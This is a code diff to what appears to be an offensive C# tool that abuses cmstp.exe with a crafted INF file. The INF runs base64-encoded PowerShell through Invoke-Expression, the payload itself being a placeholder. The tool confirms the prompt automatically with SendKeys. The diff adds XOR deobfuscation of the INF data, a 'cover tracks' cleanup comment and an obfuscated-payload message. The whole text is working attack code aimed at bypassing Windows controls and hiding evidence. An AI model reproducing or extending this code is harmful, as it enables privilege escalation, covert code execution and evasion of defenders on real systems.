@@ -21,7 +21,7 @@ RunPreSetupCommands=RunPreSetupCommandsSection
 [RunPreSetupCommandsSection]
 REPLACE_COMMAND_LINE
 taskkill /F /IM cmstp.exe
-powershell -c Start-Sleep -Seconds 5; Invoke-Expression ""$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('B64ENCODEDPS1')))""
+powershell -c Start-Sleep -Seconds 5; Invoke-Expression ""$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('>b64PayloadHere<')))""
 
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
@@ -48,6 +48,13 @@ ShortSvcName=""CorpVPN""
         }
 
         return Encoding.UTF8.GetString(infBytes);
+    }
+
+    // Function to deobfuscate INF data using XOR
+    public static string DeobfuscateInfData(string obfuscatedInfData)
+    {
+        // Deobfuscation is the same as obfuscation because XOR is symmetric
+        return ObfuscateInfData(obfuscatedInfData);
     }
 
     [DllImport("user32.dll")]
@@ -90,7 +97,7 @@ ShortSvcName=""CorpVPN""
 
         string infFilePath = SetInfFile(commandToExecute, obfuscatedInfData);
 
-        Console.WriteLine("Payload file written to " + infFilePath);
+        Console.WriteLine("Obfuscated payload file written to " + infFilePath);
 
         ProcessStartInfo cmstpStartInfo = new ProcessStartInfo(BinaryPath)
         {
@@ -107,6 +114,7 @@ ShortSvcName=""CorpVPN""
 
         SendKeys.SendWait("{ENTER}");
 
+        // Clean up and cover tracks
         CleanUp(infFilePath);
     }
 
